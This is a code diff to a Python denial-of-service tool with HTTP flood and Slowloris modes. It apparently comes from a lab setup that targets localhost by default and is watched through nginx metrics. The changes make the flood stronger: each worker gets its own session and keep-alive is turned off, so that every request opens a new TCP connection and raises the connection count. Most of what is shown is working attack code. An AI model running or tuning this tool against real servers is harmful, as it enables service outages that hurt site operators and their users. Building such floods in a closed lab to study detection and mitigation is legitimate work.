@@ -89,15 +89,18 @@ _USER_AGENTS = [
 
 # ── Attack session factory ────────────────────────────────────────────────────
 def create_attack_session() -> requests.Session:
+    """Each worker gets its own session - no shared pool bottleneck."""
     session = requests.Session()
-    # No retries – fast-fail so threads recycle quickly
     adapter = HTTPAdapter(
         max_retries=Retry(total=0),
-        pool_connections=20,
-        pool_maxsize=50,
+        pool_connections=1,
+        pool_maxsize=1,
     )
     session.mount("http://", adapter)
     session.mount("https://", adapter)
+    # Disable keepalive so each request uses a fresh TCP connection
+    # This maximizes connection count visible to nginx (realistic flood)
+    session.headers.update({"Connection": "close"})
     return session
 
 
@@ -105,9 +108,12 @@ def create_attack_session() -> requests.Session:
 #  MODE 1: HTTP FLOOD
 # ═══════════════════════════════════════════════════════════════════════════════
 
-def _http_flood_worker(session: requests.Session, url: str, worker_id: int) -> None:
-    """Single worker: hammers the URL as fast as possible until _stop_event."""
+def _http_flood_worker(url: str, worker_id: int) -> None:
+    """Single worker: each has its own session, hammers URL as fast as possible."""
     global _req_sent, _req_success, _req_error, _req_timeout
+
+    # Own session → avoids shared pool bottleneck with 150 workers
+    session = create_attack_session()
 
     while not _stop_event.is_set():
         ua = random.choice(_USER_AGENTS)
@@ -153,12 +159,10 @@ def run_http_flood(url: str, num_workers: int, duration: int) -> None:
     print(f"  {GRAY}     Request Rate spike + Latency explosion + 5xx errors appear.{RESET}")
     print(f"\n  {RED}{'─'*60}{RESET}")
 
-    # One session per worker
-    sessions = [create_attack_session() for _ in range(num_workers)]
-
+    # Each worker creates its own session inside _http_flood_worker()
     with ThreadPoolExecutor(max_workers=num_workers) as executor:
         futures = [
-            executor.submit(_http_flood_worker, sessions[i % len(sessions)], url, i + 1)
+            executor.submit(_http_flood_worker, url, i + 1)
             for i in range(num_workers)
         ]
 
@@ -436,8 +440,8 @@ Run legitimate_traffic.py in a SEPARATE terminal first, then launch this script.
         help="Attack mode: http_flood (default) or slowloris"
     )
     parser.add_argument(
-        "--url", default="http://localhost/api/data",
-        help="Target URL (default: http://localhost/api/data)"
+        "--url", default="http://127.0.0.1/api/data",
+        help="Target URL (default: http://127.0.0.1/api/data)"
     )
     parser.add_argument(
         "--workers", type=int, default=100,
@@ -460,7 +464,7 @@ Run legitimate_traffic.py in a SEPARATE terminal first, then launch this script.
     # Parse host/port from URL for Slowloris raw socket
     from urllib.parse import urlparse
     parsed = urlparse(args.url)
-    host = parsed.hostname or "localhost"
+    host = parsed.hostname or "127.0.0.1"
     port = parsed.port or (443 if parsed.scheme == "https" else 80)
 
     scale = args.workers if args.mode == "http_flood" else args.connections
